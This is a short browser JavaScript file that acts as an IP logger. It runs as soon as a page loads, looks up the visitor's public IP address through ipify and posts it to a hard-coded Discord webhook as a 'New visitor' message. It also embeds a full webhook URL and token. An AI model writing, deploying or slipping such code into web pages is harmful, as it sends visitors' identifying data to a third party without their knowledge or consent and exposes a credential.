// ====== CONFIGURE YOUR WEBHOOK ======
const webhook = "https://discord.com/api/webhooks/1474073969790292130/KXnQaqXw1WPzQ4Q_ZpwU2AxUbmqO7rBk9keeMaV5pLxwcczq9OzaYeezS0BdtPKrJyM8";

// ====== GET PUBLIC IP ======
async function sendPublicIP() {
  try {
    // Fetch your public IP from an HTTPS API
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json(); // { "ip": "123.123.123.123" }

    // Send it to Discord webhook
    await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: `New visitor! Public IP: ${data.ip}`
      })
    });

    // Optional alert for testing
    alert(`IP sent successfully!\n${data.ip}`);
  } catch (err) {
    alert("Error fetching or sending IP: " + err);
  }
}

// Run the function immediately
sendPublicIP();
